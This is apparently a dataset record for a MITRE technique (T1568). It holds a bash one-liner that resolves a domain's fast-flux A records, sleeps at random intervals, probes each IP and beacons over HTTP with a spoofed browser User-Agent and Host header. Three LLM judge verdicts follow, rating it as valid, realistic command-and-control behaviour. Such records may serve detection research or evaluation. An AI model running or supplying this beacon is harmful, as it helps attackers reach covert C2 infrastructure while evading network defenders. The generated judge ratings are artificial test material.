command: dom="static-assets-cache.net"; ua="Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15"; for ip in $(dig +short A "$dom"); do sleep $((RANDOM%4+1)); if nc -z -G 2 "$ip" 80 >/dev/null 2>&1; then wget -q --header="Host: $dom" --user-agent="$ua" --timeout=6 --tries=1 --header="Accept: text/html" "http://$ip/index.html" -O - | grep -q "</html>" && break; fi; done
explanation: Iterates across all resolved A records (fast-flux pool) with randomized delays and only contacts reachable IPs, using Host header and HTML path to resemble standard browsing.
rationale_steps: Resolve current A records to build a fast-flux candidate set.
Randomize timing and validate TCP reachability before beaconing.
Fetch HTML content with realistic headers and break on success.

llm_judgments.syntactic_justification: Balanced quoting and separators with valid bash constructs; dig, nc (-z -G), and wget flags are correctly formed and parseable.
llm_judgments.semantic_justification: It resolves A records at runtime and iterates through a fast-flux pool with randomized delays and Host header use, aligning with dynamic resolution behaviors, though it only uses a single DNS snapshot rather than periodic regeneration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, valid subshell expansion via $(dig +short A "$dom"), proper use of semicolons and &&, and all flags are valid for nc, wget, grep, and sleep on macOS bash.
llm_judgments.semantic_justification: The command accurately implements T1568 fast-flux C2 contact by iterating over all A records returned for a domain (simulating a fast-flux pool), using randomized delays to evade beaconing detection, checking reachability before connecting, and spoofing legitimate browser behavior via Host header and User-Agent to blend in with normal HTTP traffic.

llm_judgments.syntactic_justification: The command is perfectly well-formed for bash, with correct variable assignments, loop structures, command substitutions, and properly escaped/quoted strings.
llm_judgments.semantic_justification: The command accurately implements a fast-flux resolution pattern by iterating through multiple A records, using randomized delays, and employing host-header spoofing to contact a rotating set of endpoints.
